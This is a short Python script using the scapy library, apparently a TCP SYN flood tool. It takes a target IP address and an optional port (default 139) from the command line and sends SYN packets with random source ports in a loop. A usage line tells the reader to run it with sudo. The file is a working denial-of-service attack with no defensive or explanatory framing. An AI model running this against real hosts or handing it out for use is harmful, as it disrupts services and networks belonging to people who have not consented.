import sys
from scapy.all import *

if len(sys.argv) < 2:
  print "usage: sudo ./python synflood.py ip_address [dest port]"
  exit()
target = sys.argv[1]
if len(sys.argv) == 3:
  dest_port = sys.argv[2]
else:
  dest_port = 139

flood_rate = 0.2

# set large TTL
ip_layer = IP(dst = target, ttl = 200)

# build SYN packet with random source port
tcp_layer = TCP(sport = RandShort(), dport = dest_port, flags = "S")

packet = ip_layer/tcp_layer

# begin flood
ans, unans = srloop(packet, inter = flood_rate, retry = 3, timeout = 5)

